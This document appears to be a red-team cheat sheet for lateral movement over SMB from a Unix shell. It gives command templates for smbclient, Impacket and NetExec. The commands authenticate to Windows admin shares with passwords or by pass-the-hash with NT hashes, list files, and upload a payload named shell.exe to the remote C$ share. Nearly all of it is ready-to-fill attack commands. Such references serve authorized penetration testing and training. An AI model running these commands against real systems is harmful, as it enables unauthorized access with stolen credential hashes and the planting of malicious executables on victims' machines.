# Unix Shell

Search Tag(s): #lateral-movement #impacket #windows

## 01 - Authenticate

### 1.1 - Samba Suite Utils

`$ smbclient -U "[<domain_name>/]<username>%<password>" //<IP>/c$`

- Pass the Hash

`$ smbclient -U "[<domain_name>/]<username>" --pw-nt-hash <nt_hash> //<IP>/c$`

### 1.2 - Impacket

`$ smbclient.py [<domain>/]<username>:<password>@<IP>`

- Pass the Hash

`$ smbclient.py -hashes :<nt_hash> [<domain>/]<username>@<IP>`

### 1.3 - NetExec

`$ $ netexec smb <IP> -u "<username>" -p "<password>"`

- Pass the Hash

`$ $ netexec smb <IP> -u "<username>" -H "<nt_hash>"`

## 02 - List Files and Directories

### 2.1 - Samba Suite Utils

`smb: \> ls`

### 2.2 - Impacket

```
# use c$

# ls
```

### 2.3 - NetExec

```
$ netexec smb <IP> -u "<username>" -p "<password>"
```

## 03 - Copy Files

### 3.1 - Samba Suite Utils

`smb: \> put /path/to/local/shell.exe`

### 3.2 - Impacket

```
# put /path/to/local/shell.exe
```

### 3.3 - NetExec

```
$ netexec smb <IP> -u "<username>" -p "<password>" --put-file /path/to/local/shell.exe \\path\\to\\remote\\shell.exe

$ netexec smb <IP> -u "<username>" -H <nt_hash> --put-file /path/to/local/shell.exe \\path\\to\\remote\\shell.exe
```

---
## References

- [NetExec Wiki: Get and Put Files](https://www.netexec.wiki/smb-protocol/get-and-put-files)